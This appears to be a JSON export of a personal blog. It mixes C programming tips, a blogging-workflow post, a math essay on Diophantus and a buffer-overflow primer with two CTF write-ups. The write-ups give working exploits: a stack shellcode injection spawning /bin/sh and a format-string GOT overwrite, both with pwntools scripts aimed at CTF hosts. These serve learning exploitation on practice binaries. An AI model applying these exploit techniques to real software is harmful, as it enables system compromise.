printf(\u0026#34;sum=%d\u0026#34;, result.sum); printf(\u0026#34;mult=%d\u0026#34;, result.mul); } struct Result calc (int x, int y){ struct Result res; res.sum = x + y; res.mul = x * y; return res; } C structs are a decent way of passing multiple values around functions,\nespecially when these values are of different types, we can also get around\ntyping Struct Result a bunch of times by adding a typedef that introduces a new\ntype in our code, It makes our code a bit cleaner and easier to read.\nThis is the same code but with introducing the typedef.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; typedef struct Result{ int sum, mul; }; Result calc (int x, int y); int main(void){ int x = 10, y = 50; Result result = calc(x, y); printf(\u0026#34;sum=%d \u0026#34;, result.sum); printf(\u0026#34;mult=%d\u0026#34;, result.mul); } Result calc (int x, int y){ Result res; res.sum = x + y; res.mul = x * y; return res; } Note: All these solutions are ways to return multiple values from a function, unlike modern languages like python we can\u0026rsquo;t do this in C, another good solution is splitting the calc function two two spearate functions where each one of them will return It\u0026rsquo;s result, sometimes this can be better than the above approaches and It\u0026rsquo;s all depending on taste.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int sum (int x, int y); int mul (int x, int y); void main(void){ int x = 10, y = 50; printf(\u0026#34;sum=%d \u0026#34;, sum(x,y)); printf(\u0026#34;mult=%d\u0026#34;, mul(x,y)); } int sum (int x, int y){ int sum = x + y; return sum; } int mul (int x, int y){ int mul = x * y; return mul; } ","description":"I was having a chit-chat with a friend discussing some C language shenanigans when he sent me a code snippet, he wanted me fix the code and get it to work in 4 different ways.","id":11,"section":"posts","tags":null,"title":"Ways to return function values in C","uri":"/posts/passing-values-in-c/"},{"content":"I started blogging at 2020 and was using Hugo as my go-to Static Site Generator, It was pretty fast and did the job well (Jekyll yes, I\u0026rsquo;m looking you).\nThe process went as follows:\nI had two repos, one for the blog config files and the markdown sources of my posts. I then build these files using hugo build into static HTML pages which I push to another repo that serves my blog through github pages.\nThe process went as follows:\nPull a fresh copy of my blog config repo Create a new .md file with my new blog post Commit the changes to my repo and push Build the repo to generate the static website Push the website to the gh pages serving repo This process was very boring and sometimes I\u0026rsquo;d forget to sync my repos across the different machines I use, eventaully I just used dropbox to store the blog config. and .md files but I still wasn\u0026rsquo;t satisfied with my setup.\nNew Blogging Workflow I was searching for any new SSG besides hugo until I found zola which is very similar to hugo except It\u0026rsquo;s more barebones which is something I liked (rust ftw!), I migrated my posts and started thinking about an easier alternative to my current workflow.\nCI/CD is just fancy make I\u0026rsquo;d always hear about this CI/CD jargon and I finally thought it\u0026rsquo;s time to give it a try, It was surprisingly easy too.\nIt\u0026rsquo;s like make but for the cloud ain\u0026rsquo;t it?\nI created my repo with the source code for my blog and some random yaml file which I copy-pasted from the internet and voila!\nNow I can just push any new .md file to the repo and It will automatically build and deploy for a gh pages branch for me.\nEndless possibilities It\u0026rsquo;s not just about deploying with a single push, I can even blog using my browser directly from the web.\nHackmd is a markdown editor for the browser which has github integration, so I can just write my blog there and Github will handle the rest.\nThe only downside to this workflow is how Hackmd uses imgur to host images, I wish there\u0026rsquo;d be an easier approach to have the images self-contained in the repo.\nUpdate 19/12/2022 I have switched from hackmd to https://github.dev, the integrated vscode gave me a more streamlined experience and I enjoyed my workflow even more.\nI have switched back to hugo since I found a really cool theme which had all of the features I wanted, I\u0026rsquo;m kinda lazy to write my own theme at this point so I keep hopping between different themes I like, let\u0026rsquo;s see for how long I will stick with the current theme.\n","description":"I started blogging at 2020 and was using Hugo as my go-to Static Site Generator, It was pretty fast and did the job well (Jekyll yes, I'm looking you).","id":12,"section":"posts","tags":null,"title":"My new blogging workflow","uri":"/posts/new-ssg/"},{"content":"These are by far the best resources I have found and have actually tried since I started learning binary exploitation.\nDon\u0026rsquo;t waste your time choosing which is the best resource, just pick one and start digging in. They are all awesome!\nVideo Dr. Ali Hadi\u0026rsquo;s Offensive Software Exploitation | English - Arabic Nakerah Network\u0026rsquo;s BOF Playlist - Arabic (Windows) Hegzploit - Arabic LiveOverflow GynvaelEN Search for topics on ippsec.rocks The Cyber Mentor\u0026rsquo;s Playlist (Windows) - New Updated Video PinkDraconian\u0026rsquo;s Playlist John Hammond\u0026rsquo;s Playlist John Hammond\u0026rsquo;s PicoCTF2022 Binary Exploitation Walkthroughs CryptoCat Intro to BinEx Full Fledged Courses Pwn College Georgia Institute of Technology Course Guyintuxedo - Nightmare Practice Material Exploit Exercises picoCTF pwnable.tw pwnable.kr ROP Emporium ","description":"A curated list of top notch pwn resources.","id":13,"section":"posts","tags":null,"title":"Binary Exploitation Resources","uri":"/posts/bof-resources/"},{"content":"In this series of blog posts, I will be discussing some of my favorite topics in math, It mostly falls under the domains of mathematical logic and computability theory.\nDiophantus of Alexandria Diophantus was a Greek mathematician that flourished around 250 AD, he is most famous for his book \u0026ldquo;Arithmetica\u0026rdquo; in which he had compiled 130 algebraic problems among thirteen books where most of their solutions were positive integers, and that\u0026rsquo;s why mathematicians call such algebraic equations as \u0026ldquo;Diophantine Equations\u0026rdquo;.\nIt is said that he wrote his book \u0026ldquo;Arithmetica\u0026rdquo; as a distraction from his son\u0026rsquo;s death, and it turned out to be one of the most brilliant books that discussed algebra and he was amongst the first to use symbolic representations for real-life problems, he was also the first to use powers of more than 2 and 3 which had no physical meaning unlike the square and the cube, his solutions also never involved zeroes or negative numbers.\nDiophantus had a brilliant way of solving problems involving multiple variables using only a single variable, he did it in such a way that he finds relations that represent the other variables in terms of the first variable.\nA Diophantine Problem For Example, In his first problem of the fourth book:\n\u0026ldquo;Divide a given number into two cubes such that the sum of their sides is a given number\u0026rdquo;.\nHe then provides two numbers:\nGiven Number: 370 Sum of Sides: 10 Normal Approach We can visualize the problem Geomterically as follows:\nLet\u0026rsquo;s solve it using second grade algebra!\nThe two sides ($x$ and $y$) add up to 10 and the sum of their cubes ($x^3$ and $y^3$) is 370.\n$$x + y = 10$$\n$$x^3 + y^3 = 370$$\n$$x = 10 - y$$\n$$(10 - y)^3 + y^3 = 370$$\n$$(1000 + 30y^2 - 300y - y^3) + y^3 = 370$$\n$$30y^2 - 300y + 630 = 0$$\n$$y^2 - 10y + 21 = 0$$\n$$(y - 7)(y - 3) = 0$$\n$$\\boxed{x = 7}\\ \\boxed{y = 3}$$\nI didn\u0026rsquo;t want to bother with a detailed explanation of the steps above (I hope all of those who are reading this know some basic algebra), here is how Diophantus solved such problems.\nDiophantus\u0026rsquo;s Approach He would first express the two variables $x$ and $y$ as two relations in terms of one variable so his $x$ will be $(5+x)$ and his $y$ will be $(5-x)$.\n$$(5 + x) + (5 - x) = 10$$\nThese indeed satisfy the first equation and will yield 10 upon adding them together, and for the second equation, he describes it as follows:\n$$(5 + x)^3 + (5 - x)^3 = 370$$\nIt will seem a bit odd and crazy at first, but once we start expanding these cubes, terms will start canceling out like crazy until we are left with:\n$$30x^2 + 250 = 370$$\nWhich will yield:\n$$x^2 = 4$$\nFinally we arrive at the same solution:\n$$x = 2$$\n$$(x + 5) = {\\bf 7}$$\n$$(x - 5) = {\\bf 3}$$\nhis problems may seem plain and simple at the first glance but they sometimes become very tough and hard to attack, a famous quote by the German mathematician Hermann Hankel regarding the diophantine problems, \u0026ldquo;Every question requires a quite special method, which often will not serve even for the most closely allied problems. It is on that account difficult for a modern mathematician even after studying 100 Diophantine solutions to solve the 101st problem\u0026rdquo;\nFermat\u0026rsquo;s Last Theorem Pierre de Fermat was a famous 17th-century French mathematician, he had a copy of Diophantus\u0026rsquo;s Arithmetica and had filled its margins extensively with notes.\nAt one of the problems that involved a solution in the form of $x^2\\ +\\ b^2\\ =\\ c^2$, Fermat wrote:\n\u0026ldquo;On the contrary, it is impossible to separate a cube into two cubes, a fourth power into two fourth powers, or generally any power above the second into two powers of the same degree. I have discovered a truly marvelous demonstration which this margin is too narrow to contain.‚Äù\nThis nonexistent proof became knows as ‚ÄúFermat‚Äôs Last Theorem‚Äù, It was later solved by the British Number Theorist Andrew Wiles in 1993 after three and a half centuries, he then received the Abel Prize in 2016 for his solution.\n","description":"In this series of blog posts, I will be discussing some of my favorite topics in math, It mostly falls under the domains of mathematical logic and computability theory.","id":14,"section":"posts","tags":["math"],"title":"A Journey into Mathematical Logic: Diophantus of Alexandria","uri":"/posts/diophantus/"},{"content":"In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag.\nyou can find the binary for this challenge here\nInitial Analysis We start by running the binary and checking it behavior.\n./leaky_pipe We have just fixed the plumbing systm, let\u0026#39;s hope there\u0026#39;s no leaks! \u0026gt;.\u0026gt; aaaaah shiiit wtf is dat address doin here... 0x7ffde7760410 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \u0026lt;--- our input Segmentation fault (core dumped) And as we see, we can already get a segfault by spamming some A\u0026rsquo;s in the input.\nOne intersting catch is that address in the output of the binary, we also note that it changes everytime we run the binary so the binary probably is a PIE (Position Independent Executable).\nLet\u0026rsquo;s run a checksec to make sure of our hypothesis.\ngef‚û§ checksec [+] checksec for \u0026#39;/vagrant/leaky_pipe/leaky_pipe\u0026#39; Canary : ‚úò NX : ‚úò PIE : ‚úì Fortify : ‚úò RelRO : Partial Seems like we have everything disabled except PIE just as predicted.\nReversing the binary Let\u0026rsquo;s load the binary in ghidra and check the generated decompilation, sometimes this can save a lot of time trying to understand a disassembly.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 undefined8 main(void) { basic_ostream *pbVar1; basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *this; ssize_t sVar2; undefined8 uVar3; undefined local_28 [32]; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,2,0); pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout, \u0026#34;We have just fixed the plumbing systm, let\\\u0026#39;s hope there\\\u0026#39;s no leaks!\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout, \u0026#34;\u0026gt;.\u0026gt; aaaaah shiiit wtf is dat address doin here... \u0026#34;); this = (basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *) std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1,local_28); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; (this,std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sVar2 = read(0,local_28,0x40); if (sVar2 \u0026lt; 5) { pbVar1 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,\u0026#34;no smol input plz\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); uVar3 = 0xffffffff; } else { uVar3 = 0; } return uVar3; } The binary is fairly simple to reverse, it\u0026rsquo;s written in C++ so the decompilation may seem overwhelming at the first glance but its actually quite simple!\nWe are intersted in the part at line 16 where it reads 0x40 bytes from STDIN to the buffer named local_28.\n1 sVar2 = read(0,local_28,0x40); On checking the variable local_28 we can see that it\u0026rsquo;s only 32 bytes long and we are trying to read 64 (0x40) bytes into it, and that\u0026rsquo;s why we got a segfault.\n1 undefined local_28 [32]; One more thing we notice on analyzing the decompilation is the address we saw at the output of the binary, here is the part we are intersted in.\n1 2 3 this = (basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *) std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar1,local_28); Seems like it\u0026rsquo;s printing a pointer to the buffer local_28!\nThis is just too good to be true at this point, we have a leaked address of a buffer that we control.\nIf we recall our checksec result we saw that NX-bit was not set so this meaning we can execute arbitrary shellcode on the stack.\nLet\u0026rsquo;s fireup our editor and start creating the exploit using a 64-bit execve(*\u0026quot;/bin/sh/\u0026quot;) shellcode.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from pwn import * context.binary = \u0026#39;leaky_pipe\u0026#39; OFFSET = 40 if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#39;ctf.0xl4ugh.com\u0026#39;, 4141) else: io = process(\u0026#39;leaky_pipe\u0026#39;) # Extract the buffer address that is leaked so we can use it in our exploit print(io.recvuntil(\u0026#34;...\u0026#34;)) address = io.recvlineS().strip() address = int(address,0) # Shellcode from https://www.exploit-db.com/exploits/42179 # We start filling the buffer with our shellcode # and the remaining bytes are padded with A\u0026#39;s. payload = b\u0026#34;\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05\u0026#34; payload += (b\u0026#34;A\u0026#34;* (40 - len(payload))) # We then overwrite the return adderss with the leaked address # which is the start of our shellcode. payload += p64(address) io.sendline(payload) io.interactive() ","description":"In this challenge we recieved a binary in which we are asked to exploit and somehow retrieve the flag.","id":15,"section":"posts","tags":["pwn"],"title":"Leaky Pipe - 0xL4ugh CTF","uri":"/posts/leaky-pipe/"},{"content":"It was the first ever pwn challenge I solve in a CTF and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It\u0026rsquo;s pretty awesome to look back and see how much did we grow).\nYou can check my video on format string vulnerabilies as a refresher for these types of attacks (It\u0026rsquo;s in arabic tho).\nYou can download the challenge\u0026rsquo;s bianry from my github here\nInitial Static Analysis We start by analyzing the bianry and checking the protections\n1 2 $ file trigger_happy trigger_happy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=de726633c6d3ec5839065e67784dcfdb3497b074, for GNU/Linux 3.2.0, not stripped 1 2 3 4 5 6 7 8 $ gdb trigger_happy gef‚û§ checksec [+] checksec for \u0026#39;/home/vagrant/ctf/0xl4ugh/trigger_happy\u0026#39; Canary : ‚úò NX : ‚úò PIE : ‚úò Fortify : ‚úò RelRO : Partial Seems like we are dealing with 32 bit not stripped ELF bianry.\nInitial Dynamic Analysis On running the binary, it\u0026rsquo;s gonna ask for input and then print it out for us.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? AAAABBBBCCCCDDDD I am glad you AAAABBBBCCCCDDDD We wish you luck! Seems suspecious, let\u0026rsquo;s try %x as input and see what do we get.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? %x %x %x I am glad you 200 f7f52540 80491d1 We wish you luck! Voila, seems like we found a format string vulnerable pivot which we can use to leak stack values or even write to pointers on the stack.\nWe can further confirm our assumptions by checking the disassembly of our binary for a printf() call with only one argument, but we are going to skip this step.\nOne more thing we are going to do is locating the index of the stack entry we control with the printf function, a simple way to do this is by placing an egg and following it with a couple of %x\u0026rsquo;s until we can see our egg in the leaked addresses and then we can get its index.\n1 2 3 4 5 6 7 $ ./trigger_happy Do you like 0xL4ugh CTF? AAAA %x %x %x %x %x %x %x %x I am glad you AAAA 200 f7fbb540 80491d1 41414141 20782520 25207825 78252078 20782520 We wish you luck! We can see the hex value for our egg (AAAA) at the 4th entry on the stack.\nMore Static Analysis I always love to start the analysis by listing the current function in the binary using gdb, and happily our binary isn\u0026rsquo;t stripped.\ngef‚û§ info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 printf@plt 0x08049040 fgets@plt 0x08049050 getegid@plt 0x08049060 puts@plt 0x08049070 system@plt 0x08049080 __libc_start_main@plt 0x08049090 setvbuf@plt 0x080490a0 setresgid@plt 0x080490b0 _start 0x080490f0 _dl_relocate_static_pie 0x08049100 __x86.get_pc_thunk.bx 0x08049110 deregister_tm_clones 0x08049150 register_tm_clones 0x08049190 __do_global_dtors_aux 0x080491c0 frame_dummy 0x080491c2 response 0x08049245 flaggy 0x08049270 main 0x080492eb __x86.get_pc_thunk.ax 0x080492f0 __libc_csu_init 0x08049350 __libc_csu_fini 0x08049351 __x86.get_pc_thunk.bp 0x08049358 _fini The only function which seems suspecious is \u0026ldquo;flaggy\u0026rdquo; which kinda sounds like \u0026ldquo;flag\u0026rdquo;?\nLet\u0026rsquo;s disassmble it.\n$ disas flaggy Dump of assembler code for function flaggy: 0x08049245 \u0026lt;+0\u0026gt;: push ebp 0x08049246 \u0026lt;+1\u0026gt;: mov ebp,esp 0x08049248 \u0026lt;+3\u0026gt;: push ebx 0x08049249 \u0026lt;+4\u0026gt;: sub esp,0x4 0x0804924c \u0026lt;+7\u0026gt;: call 0x80492eb \u0026lt;__x86.get_pc_thunk.ax\u0026gt; 0x08049251 \u0026lt;+12\u0026gt;: add eax,0x2daf 0x08049256 \u0026lt;+17\u0026gt;: sub esp,0xc 0x08049259 \u0026lt;+20\u0026gt;: lea edx,[eax-0x1fb6] 0x0804925f \u0026lt;+26\u0026gt;: push edx 0x08049260 \u0026lt;+27\u0026gt;: mov ebx,eax 0x08049262 \u0026lt;+29\u0026gt;: call 0x8049070 \u0026lt;system@plt\u0026gt; 0x08049267 \u0026lt;+34\u0026gt;: add esp,0x10 0x0804926a \u0026lt;+37\u0026gt;: nop 0x0804926b \u0026lt;+38\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x0804926e \u0026lt;+41\u0026gt;: leave 0x0804926f \u0026lt;+42\u0026gt;: ret End of assembler dump. It seems like it\u0026rsquo;s executing a command stored in the edx pointer (since edx is pushed to the stack before the system() call) but we aren\u0026rsquo;t sure what exactly, but we can do a little trick to inspect what exactly is getting called.\nWe modify our eip to the start of the function flaggy.\n1 gef‚û§ set $eip=0x08049245 Then we can step a couple of instructions or set a breakpoint so we can get to the push edx instruction.\n1 2 gef‚û§ x/s $edx 0x804a04a: \u0026#34;cat flag.txt\u0026#34; Yep it is actually trying to cat our flag!\nOn checking the main() function we see that it just sets the buffers and jumps to some other function named response() which takes our input and prints it out using the vulnerable printf as we have just seen.\nHere is the disassembly for reference.\ngef‚û§ disas response Dump of assembler code for function response: 0x080491c2 \u0026lt;+0\u0026gt;: push ebp 0x080491c3 \u0026lt;+1\u0026gt;: mov ebp,esp 0x080491c5 \u0026lt;+3\u0026gt;: push ebx 0x080491c6 \u0026lt;+4\u0026gt;: sub esp,0x204 0x080491cc \u0026lt;+10\u0026gt;: call 0x8049100 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x080491d1 \u0026lt;+15\u0026gt;: add ebx,0x2e2f 0x080491d7 \u0026lt;+21\u0026gt;: sub esp,0xc 0x080491da \u0026lt;+24\u0026gt;: lea eax,[ebx-0x1ff8] 0x080491e0 \u0026lt;+30\u0026gt;: push eax 0x080491e1 \u0026lt;+31\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x080491e6 \u0026lt;+36\u0026gt;: add esp,0x10 0x080491e9 \u0026lt;+39\u0026gt;: mov eax,DWORD PTR [ebx-0x8] 0x080491ef \u0026lt;+45\u0026gt;: mov eax,DWORD PTR [eax] 0x080491f1 \u0026lt;+47\u0026gt;: sub esp,0x4 0x080491f4 \u0026lt;+50\u0026gt;: push eax 0x080491f5 \u0026lt;+51\u0026gt;: push 0x200 0x080491fa \u0026lt;+56\u0026gt;: lea eax,[ebp-0x208] 0x08049200 \u0026lt;+62\u0026gt;: push eax 0x08049201 \u0026lt;+63\u0026gt;: call 0x8049040 \u0026lt;fgets@plt\u0026gt; 0x08049206 \u0026lt;+68\u0026gt;: add esp,0x10 0x08049209 \u0026lt;+71\u0026gt;: sub esp,0xc 0x0804920c \u0026lt;+74\u0026gt;: lea eax,[ebx-0x1fdd] 0x08049212 \u0026lt;+80\u0026gt;: push eax 0x08049213 \u0026lt;+81\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x08049218 \u0026lt;+86\u0026gt;: add esp,0x10 0x0804921b \u0026lt;+89\u0026gt;: sub esp,0xc 0x0804921e \u0026lt;+92\u0026gt;: lea eax,[ebp-0x208] 0x08049224 \u0026lt;+98\u0026gt;: push eax 0x08049225 \u0026lt;+99\u0026gt;: call 0x8049030 \u0026lt;printf@plt\u0026gt; 0x0804922a \u0026lt;+104\u0026gt;: add esp,0x10 0x0804922d \u0026lt;+107\u0026gt;: sub esp,0xc 0x08049230 \u0026lt;+110\u0026gt;: lea eax,[ebx-0x1fcf] 0x08049236 \u0026lt;+116\u0026gt;: push eax 0x08049237 \u0026lt;+117\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x0804923c \u0026lt;+122\u0026gt;: add esp,0x10 0x0804923f \u0026lt;+125\u0026gt;: nop 0x08049240 \u0026lt;+126\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x08049243 \u0026lt;+129\u0026gt;: leave 0x08049244 \u0026lt;+130\u0026gt;: ret End of assembler dump. Exploitation Plan Since we have a format string vulnerability, we can control the flow of our binary by altering any pointer we supply to the stack.\nWe also do have a target function which we want to call in order to cat our flag (flaggy).\nseems like everything is now connected! we can overwrite any libc call in our response() function with just the flaggy function.\nA good candidate is puts! Let\u0026rsquo;s find it\u0026rsquo;s GOT address in gdb.\ngef‚û§ got puts GOT protection: Partial RelRO | GOT functions: 8 [0x804c018] puts@GLIBC_2.0 ‚Üí 0xf7e3e380 So our puts address in the global offset table is 0x804c018 which is actually a pointer to the actual libc puts.\nNow its time to get the address of the function we are overwriting the puts pointer with.\ngef‚û§ x flaggy 0x8049245 \u0026lt;flaggy\u0026gt;: 0x53e58955 The address of flaggy is 0x8049245.\nNow we have everything we need and it\u0026rsquo;s time to craft our exploit!\nCrafting the exploit 1. Doing it the hard way Let\u0026rsquo;s start with crafting our exploit without using any scripts or fancy tools.\nHere is the info we have gathered so far.\nprintf entry that we control is at index 4 puts pointer address: 0x804c018z flaggy function address: 0x8049245 our payload will be as follows:\npointer data to be written the write specifier\nwhich is equivalent to the following:\n0x804c018 %(0x8049245 - 4)x %4$n\nconvert puts address to little endian and equate the integer value of (0x8049245 - 4)\n\\x18\\xc0\\x04\\x08 %134517313x %4$n but on using this payload we literally write 134517313 blank characters to stdout which is going to take ~2 mins everytime we are trying to execute the payload.\nThis makes it pretty damn hard to test and debug our payload, but the good news is we can use an alternate faster method using short writes (2-bytes write) instead of an integer write (4-byte write).\nInstead of directly writing to the puts pointer 0x804c018 we can write two bytes 0x804 to the upper nibbe of the pointer 0x804c018 + 2 and another two bytes 0x9245 to the lower nibble of the pointer 0x804c018.\nDon\u0026rsquo;t forget that we need to subtract the amount of charcters written so far from each write we do.\nHere is the payload:\n0x804c018+2 0x804c018 %(0x804-8)x %4$n %(0x9245-0x804)x %5$n\nWe will convert the first two addresses to little endian and the second two addresses to their integer equivalent.\n\\x1a\\xc0\\x04\\x08 \\x18\\xc0\\x04\\x08 %2044x %4$hn %35393x %5$hn\nAnd we can use echo with the -e flag to pass it to our binary escaping the \u0026ldquo;$\u0026rdquo; using a forward slash.\n1 echo -e \u0026#34;\\x1a\\xc0\\x04\\x08\\x18\\xc0\\x04\\x08%2044x%4\\$hn%35393x%5\\$hn\u0026#34; | ./trigger_happy And we get our flag!\n2. Using pwntools to craft our exploit. Here is how I built the same exploit using python and pwntools.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * OFFSET = 4 elf = ELF(\u0026#39;./trigger_happy\u0026#39;) if args[\u0026#39;REMOTE\u0026#39;]: io = remote(\u0026#39;ctf.0xl4ugh.com\u0026#39;, 1337) else: io = process(\u0026#39;./trigger_happy\u0026#39;) puts = elf.got[\u0026#39;puts\u0026#39;] win = elf.symbols[\u0026#39;flaggy\u0026#39;] payload = fmtstr_payload(OFFSET, {puts: win}, write_size=\u0026#39;byte\u0026#39;) def run(): print(io.readlineS()) io.sendline(payload) print(io.recvallS()) if __name__ == \u0026#39;__main__\u0026#39;: run() ","description":"This is a challenge from 0xl4ugh CTF which was inspired by RACTF's not really ai challenge.","id":16,"section":"posts","tags":["pwn"],"title":"Trigger Happy - 0xL4ugh CTF","uri":"/posts/trigger-happy/"},{"content":"\nWhat is a Buffer anyway? We can think of buffers as containers to hold our data for later use, it\u0026rsquo;s not really something specific to computer science; In fact, we have buffers in electronics, mechanics, chemistry and even politics!\nWe can say that the word buffer is just a fancy name for a placeholder (temporary storage)!\nBuffer in Computer Science Now, it\u0026rsquo;s time to get more technical and get to know buffers more in computer science!\nOnline video streaming is a pretty good application of buffering, back in the old days we would see YouTube showing that nostalgic loading bar while waiting the video to load and that\u0026rsquo;s exactly why we use buffers!\nWe need to store video data in someplace so that when we need that data we can load it directly from the computer\u0026rsquo;s memory since we can\u0026rsquo;t really have our internet connection playback videos in realtime without having some temporarily storage for data to reside in, and that\u0026rsquo;s the reason why livestreams never sync with realtime and have a couple seconds delay.\nhere is a more lower level representation of a buffer:\n1 2 3 4 5 6 7 #define BUFSIZE 1024 char buffer[BUFSIZE]; size_t len; // ... later while((len=read(STDIN, \u0026amp;buffer, BUFSIZE)) \u0026gt; 0) write(STDOUT, buffer, len); This snippet basically check for data available then reads it from the standard input (command line) and writes that data back to the standard output (command line too).\nBuffer Overflows! It\u0026rsquo;s time for the good stuff now!\nLet\u0026rsquo;s say we have an arbitrary variable of size 5 bytes, and we stored some value in that variable which exceeds 5 bytes, that\u0026rsquo;s a simple buffer overflow!\n1 2 3 4 5 6 char someVariable[5]; /* we are trying to copy 15 bytes to a 5 bytes sized variable */ memcpy(someVariable, \u0026#34;Hello, world!\\n\u0026#34;, 15); printf(someVariable); We encounter buffer overflows more frequently than we imagine, ever seen Segmentation Fault appear in your C program out of nowhere? That\u0026rsquo;s also a buffer overflow but your computer has prevented it from causing any damage and stopped the program from running.\nLet\u0026rsquo;s get back to our 5 bytes overflown variable example. What happens to the overflown data? Where is it\u0026rsquo;s destination? Does it get lost in the void of nothingness?\nNope, in fact we just overwrite other data when we overflow any variable, and that\u0026rsquo;s the core of our problem. We can\u0026rsquo;t just overwrite data and act as if nothing happened. What if we overwrite important data? What if we can overwrite data related to process memory and already running programs?\nThese are all possibilities which are just a mere consequence of buffer overflows and can cause great damage to computers\nWeaponizing Buffer Overflows A basic technique used by hackers when exploiting buffer overflow vulnerabilities is determining the place where data gets overwritten and handcrafting the overflown data to inject arbitrary code in the program, imagine if that program runs at elevated privileges and a hacker takes control of it\u0026rsquo;s execution flow, you get pwned.\nAnd that\u0026rsquo;s just the basic technique in abusing buffer overflow vulnerabilities.\nAm I Really Safe? Sadly, yes you are safe.\nBuffer overflows aren\u0026rsquo;t as popular in 2020 (as of writing this article) as they used to be back in the old days of computers, all modern processors/operating systems have strict rules and mitigations for all the paradigms and techniques of buffer overflows.\nSome of these famous mitigations are:\nASLR (Address Space Layout Randomization)\nBasically randomizes all the memory addresses at runtime whenever you execute any program so it makes it impossible to hardcode memory addresses for exploiting buffer overflow attacks\ni.e: the exploit needs to be completely dynamic\nNX Bit\nBasically marks areas of memory as non-executable, prevents hackers from injecting malicious code into areas of memory in an attempt to execute it.\nStack Canaries\nBasically generates some random value in memory at runtime and checks before returning from any function if that random value got overwritten or not, if yes then program exits.\nAnd these are just some of the basic mitigation used in 2020.\nBut again, these doesn\u0026rsquo;t really make your computer invincible as much as making it just harder for an attacker to compromise your system using buffer overflow attacks.\nHackers still can bypass these mitigations using underhanded methods such as bruteforce and leaking addresses from memory but using these mitigations correctly can make buffer overflows nearly useless.\nIt\u0026rsquo;s also worthy to mention that buffer overflows can be prevented from the programmers side by following the coding best practices and avoiding unsanitized input etc\u0026hellip;\n","description":"A basic introduction to buffer overflows to people who haven't heard about it before.","id":17,"section":"posts","tags":null,"title":"Buffer Overflows for Newbies","uri":"/posts/bof-for-normies/"},{"content":"Now, that\u0026rsquo;s a bit misleading since i have been using windows for the past 12-13 years of my keyboard smashing journey but i don\u0026rsquo;t really feel any guilt doing this, in fact windows is nothing more of a bottleneck to me or so have i figured later.\nenough ranting, maybe this needs it\u0026rsquo;s own blog post after all or maybe not, it\u0026rsquo;s a highly controversial topic whatsoever. Just believe me windows is pure evil.\nSettling on an OS I have tried tons of Linux distrois but i always kept jumping from one to the next, never settled on a distro, at first i wanted to use it mainly for my cybersecurity hobby so i thought Kali would be a pretty nice choice\u0026hellip;\nbut guess what, it wasn\u0026rsquo;t\u0026hellip;\nI really think that kali is a pretty good OS but not that good for using as a daily driver system, it\u0026rsquo;s just bloated with a tons of security tools that you will never get chance to use and maybe you don\u0026rsquo;t even know of their existence.\nso i started trying different operating systems ranging from the classic debian to using arch linux which actually was the thing i liked the most!\nWhy Arch beside the fact that you get to customize your operating system to the max level, you also get the Arch User Repository (AUR) which contains 64,441 packages as of writing this, it\u0026rsquo;s a rolling release distro which basically gives you gradual little updates as they are released unlike other stable release distro that give you a bulky big update that sometimes forces you to reinstall your os.\nArch is a bit tougher than any other OS though, since they 